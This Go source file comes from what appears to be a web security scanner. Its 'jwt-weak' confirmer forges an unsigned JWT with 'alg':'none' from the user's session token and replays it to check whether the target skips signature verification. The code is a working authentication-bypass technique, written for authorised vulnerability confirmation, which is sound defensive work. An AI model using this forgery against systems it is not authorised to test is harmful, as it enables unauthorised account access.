package attack

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"github.com/JonasBorgesLM/warden/internal/core/model"
)

func init() {
	Register(jwtConfirmer{})
}

// jwtConfirmer reproduces the one jwt-weak finding that has a proof of
// concept — alg:none acceptance — and reports the structural ones
// (no-exp, long-exp) as having nothing to reproduce.
//
// It re-forges rather than replaying a captured token, for the same reason
// the scan forged in the first place: the proof is that a freshly minted
// unsigned token is honoured now, not that one was once.
type jwtConfirmer struct{}

var _ Confirmer = jwtConfirmer{}

func (jwtConfirmer) CheckName() string { return "jwt-weak" }

func (jwtConfirmer) Confirm(ctx context.Context, f model.Finding, clients model.Clients) (model.Finding, error) {
	if f.ID != "alg-none-accepted" {
		// no-exp and long-exp are read straight off the token; there is no
		// request that would "confirm" them.
		return f, ErrNoProofOfConcept
	}

	if clients.SessionToken == "" {
		return f, fmt.Errorf("no session token to forge from")
	}
	claims, ok := jwtClaims(clients.SessionToken)
	if !ok {
		return f, fmt.Errorf("the session token is no longer a decodable JWT")
	}

	forged, err := forgeAlgNone(claims)
	if err != nil {
		return f, err
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, f.Request.URL, nil)
	if err != nil {
		return f, err
	}
	req.Header.Set("Authorization", "Bearer "+forged)

	resp, err := clients.Anonymous.Do(req)
	if err != nil {
		return f, fmt.Errorf("replaying the forged token: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		f.Evidence.StatusCode = resp.StatusCode
		f.Evidence.ResponseSnippet = fmt.Sprintf(
			"did not reproduce: a freshly forged alg:none token now answers %d, so the target is not honouring it — either it was fixed or the earlier result was wrong",
			resp.StatusCode)
		return f, nil
	}

	f.Confirmed = true
	f.Evidence.StatusCode = resp.StatusCode
	f.Evidence.ResponseSnippet = fmt.Sprintf(
		"reproduced: a forged token with \"alg\":\"none\" and no signature answered %d on %s, minted just now — signature verification is not being performed",
		resp.StatusCode, f.Request.URL)
	return f, nil
}

// jwtClaims decodes the claims segment of a compact JWT.
func jwtClaims(token string) (map[string]any, bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, false
	}
	raw, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, false
	}
	var out map[string]any
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, false
	}
	return out, true
}

// forgeAlgNone mirrors the check's forgery: header {"alg":"none"}, the same
// claims, empty signature. Duplicated rather than shared because the check
// and the confirmer are separate packages and this is four lines; a shared
// helper would couple two stages that only happen to agree on a format.
func forgeAlgNone(claims map[string]any) (string, error) {
	headerJSON, err := json.Marshal(map[string]any{"alg": "none", "typ": "JWT"})
	if err != nil {
		return "", err
	}
	claimsJSON, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}
	enc := base64.RawURLEncoding
	return enc.EncodeToString(headerJSON) + "." + enc.EncodeToString(claimsJSON) + ".", nil
}
